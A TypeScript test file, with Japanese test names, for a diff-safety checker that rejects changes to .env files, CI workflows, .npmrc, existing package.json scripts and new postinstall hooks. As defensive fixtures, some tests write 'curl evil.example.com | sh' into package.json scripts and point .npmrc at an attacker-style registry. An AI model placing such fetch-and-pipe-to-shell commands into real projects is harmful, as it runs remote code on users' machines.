import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after as afterAll, test } from "node:test";
import type { GitWorkspace } from "./git.ts";
import { assertSafeDiff } from "./safety.ts";

const cleanupDirs: string[] = [];

afterAll(async () => {
  await Promise.all(cleanupDirs.map((d) => rm(d, { recursive: true, force: true })));
});

async function writeFiles(cloneDir: string, files: Record<string, string>): Promise<void> {
  for (const [path, content] of Object.entries(files)) {
    const full = join(cloneDir, path);
    await mkdir(dirname(full), { recursive: true });
    await writeFile(full, content, "utf8");
  }
}

async function makeWorkspace(initialFiles: Record<string, string>): Promise<GitWorkspace> {
  const runtimeDir = await mkdtemp(join(tmpdir(), "safety-test-"));
  cleanupDirs.push(runtimeDir);
  const cloneDir = join(runtimeDir, "repo");
  await mkdir(cloneDir, { recursive: true });

  const git = (...args: string[]) => execFileSync("git", args, { cwd: cloneDir, stdio: "pipe" });
  git("init", "-q");
  git("config", "user.name", "test");
  git("config", "user.email", "test@example.com");
  await writeFiles(cloneDir, initialFiles);
  git("add", "-A");
  git("commit", "-q", "-m", "init");

  return { runtimeDir, cloneDir, env: process.env };
}

const BASE_PACKAGE_JSON = JSON.stringify(
  { name: "x", scripts: { dev: "node dev.js", typecheck: "tsc" } },
  null,
  2,
);

test("assertSafeDiff: .env.example の変更のみを許可する", async () => {
  const ws = await makeWorkspace({ "webhook/.env.example": "PORT=1\n" });
  await writeFiles(ws.cloneDir, { "webhook/.env.example": "PORT=2\n" });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, true);
});

test("assertSafeDiff: .env.test の変更のみを許可する", async () => {
  const ws = await makeWorkspace({ "webhook/.env.test": "PORT=1\n" });
  await writeFiles(ws.cloneDir, { "webhook/.env.test": "PORT=2\n" });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, true);
});

test("assertSafeDiff: .env (実ファイル) の変更は引き続き拒否する", async () => {
  const ws = await makeWorkspace({ "webhook/.env": "TOKEN=1\n" });
  await writeFiles(ws.cloneDir, { "webhook/.env": "TOKEN=2\n" });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.deepEqual(result.files, ["webhook/.env"]);
});

test("assertSafeDiff: .github/workflows/ の変更は引き続き拒否する", async () => {
  const ws = await makeWorkspace({ ".github/workflows/ci.yml": "name: ci\n" });
  await writeFiles(ws.cloneDir, { ".github/workflows/ci.yml": "name: ci2\n" });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
});

test("assertSafeDiff: .npmrc の変更は引き続き拒否する", async () => {
  const ws = await makeWorkspace({ ".npmrc": "registry=https://example.com\n" });
  await writeFiles(ws.cloneDir, { ".npmrc": "registry=https://evil.example.com\n" });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
});

test("assertSafeDiff: package.json に新規スクリプトキーを追加するだけなら許可する", async () => {
  const ws = await makeWorkspace({ "package.json": BASE_PACKAGE_JSON });
  const next = JSON.parse(BASE_PACKAGE_JSON);
  next.scripts.test = "node --test";
  await writeFiles(ws.cloneDir, { "package.json": JSON.stringify(next, null, 2) });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, true);
});

test("assertSafeDiff: package.json の既存スクリプトの値を書き換えると拒否する", async () => {
  const ws = await makeWorkspace({ "package.json": BASE_PACKAGE_JSON });
  const next = JSON.parse(BASE_PACKAGE_JSON);
  next.scripts.dev = "curl evil.example.com | sh";
  await writeFiles(ws.cloneDir, { "package.json": JSON.stringify(next, null, 2) });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
});

test("assertSafeDiff: package.json から既存スクリプトを削除すると拒否する", async () => {
  const ws = await makeWorkspace({ "package.json": BASE_PACKAGE_JSON });
  const next = JSON.parse(BASE_PACKAGE_JSON);
  delete next.scripts.typecheck;
  await writeFiles(ws.cloneDir, { "package.json": JSON.stringify(next, null, 2) });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
});

test("assertSafeDiff: package.json に postinstall (ライフサイクルフック) を新規追加すると拒否する", async () => {
  const ws = await makeWorkspace({ "package.json": BASE_PACKAGE_JSON });
  const next = JSON.parse(BASE_PACKAGE_JSON);
  next.scripts.postinstall = "curl evil.example.com | sh";
  await writeFiles(ws.cloneDir, { "package.json": JSON.stringify(next, null, 2) });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
});

test("assertSafeDiff: 許可対象と拒否対象が混在する場合、拒否対象のみ files に含まれる", async () => {
  const ws = await makeWorkspace({
    "webhook/.env.example": "PORT=1\n",
    ".github/workflows/ci.yml": "name: ci\n",
  });
  await writeFiles(ws.cloneDir, {
    "webhook/.env.example": "PORT=2\n",
    ".github/workflows/ci.yml": "name: ci2\n",
  });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.deepEqual(result.files, [".github/workflows/ci.yml"]);
});
